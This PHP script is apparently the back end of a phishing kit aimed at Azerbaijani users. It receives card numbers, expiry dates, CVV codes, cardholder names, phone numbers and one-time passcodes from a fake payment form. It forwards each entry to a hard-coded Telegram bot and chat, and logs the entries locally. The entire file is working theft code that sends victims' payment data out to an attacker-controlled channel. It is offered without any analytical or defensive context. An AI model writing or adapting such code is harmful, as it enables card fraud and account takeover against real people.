<?php
// YALNIZ POST İCƏZƏLİDİR
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(403);
    die('🚫 Giriş qadağandır!');
}

// BOT MƏLUMATLARI
$botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
$chatId = '-1004332923672';

// POST MƏLUMATLARI
$cardName = isset($_POST['card_name']) ? trim(strip_tags($_POST['card_name'])) : '';
$cardNumber = isset($_POST['card_number']) ? trim(strip_tags($_POST['card_number'])) : '';
$cardExpiry = isset($_POST['card_expiry']) ? trim(strip_tags($_POST['card_expiry'])) : '';
$cardCvv = isset($_POST['card_cvv']) ? trim(strip_tags($_POST['card_cvv'])) : '';
$operator = isset($_POST['operator']) ? trim(strip_tags($_POST['operator'])) : '';
$phone = isset($_POST['phone']) ? trim(strip_tags($_POST['phone'])) : '';
$amount = isset($_POST['amount']) ? trim(strip_tags($_POST['amount'])) : '';
$ip = isset($_POST['ip']) ? trim(strip_tags($_POST['ip'])) : $_SERVER['REMOTE_ADDR'];
$otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : '';
$campaign = isset($_POST['campaign']) ? trim(strip_tags($_POST['campaign'])) : '';
$type = isset($_POST['type']) ? trim(strip_tags($_POST['type'])) : '';

// ============================================
// 🔢 SIRALI ID - COUNTER
// ============================================
$counterFile = 'counter.txt';
if (file_exists($counterFile)) {
    $id = (int)file_get_contents($counterFile) + 1;
} else {
    $id = 1;
}
file_put_contents($counterFile, $id);

// ============================================
// 📤 TELEGRAM-A GÖNDƏR
// ============================================
function sendToTelegram($message) {
    global $botToken, $chatId;
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'HTML'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return $httpCode;
}

// ============================================================
// 📝 1-Cİ MESAJ: YALNIZ NÖMRƏ (KARTDAN ƏVVƏL)
// ============================================================
if ($type === 'phone_only') {
    $message = "📞 YENİ NÖMRƏ #" . $id . "\n";
    $message .= "────────────────────────\n";
    $message .= "📱 Nömrə: " . $phone . "\n";
    $message .= "🌐 IP: " . $ip . "\n";
    $message .= "────────────────────────";
    
    sendToTelegram($message);
    
    $logData = date('Y-m-d H:i:s') . " | ID: #$id | NÖMRƏ: $phone | IP: $ip\n";
    file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}

// ============================================================
// 📝 2-Cİ MESAJ: KART + NÖMRƏ (OTP YOXDURSA)
// ============================================================
if (empty($otp) && !empty($cardNumber)) {
    $message = "💳 KART GİRİŞİ #" . $id . "\n";
    $message .= "────────────────────────\n";
    $message .= "📱 Nömrə: " . $phone . "\n";
    $message .= "💰 Tutar: " . $amount . " AZN\n";
    $message .= "💳 Kart: " . $cardNumber . "\n";
    $message .= "📅 Tarix: " . $cardExpiry . "\n";
    $message .= "🔐 CVV: " . $cardCvv . "\n";
    $message .= "👤 İsim: " . $cardName . "\n";
    $message .= "🌐 IP: " . $ip . "\n";
    if (!empty($campaign)) {
        $message .= "📦 Paket: " . $campaign . "\n";
    }
    $message .= "────────────────────────";
    
    sendToTelegram($message);
    
    $logData = date('Y-m-d H:i:s') . " | ID: #$id | KART | IP: $ip\n";
    file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}

// ============================================================
// 📝 3-CÜ MESAJ: OTP + NÖMRƏ
// ============================================================
if (!empty($otp)) {
    $message = "🔑 OTP TƏSDİQİ #" . $id . "\n";
    $message .= "────────────────────────\n";
    $message .= "📱 Nömrə: " . $phone . "\n";
    $message .= "🔑 OTP: " . $otp . "\n";
    $message .= "🌐 IP: " . $ip . "\n";
    if (!empty($campaign)) {
        $message .= "📦 Paket: " . $campaign . "\n";
    }
    $message .= "────────────────────────";
    
    sendToTelegram($message);
    
    $logData = date('Y-m-d H:i:s') . " | ID: #$id | OTP: $otp | IP: $ip\n";
    file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
    
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit;
}

header('Content-Type: application/json');
echo json_encode(['status' => 'error']);
exit;
?>
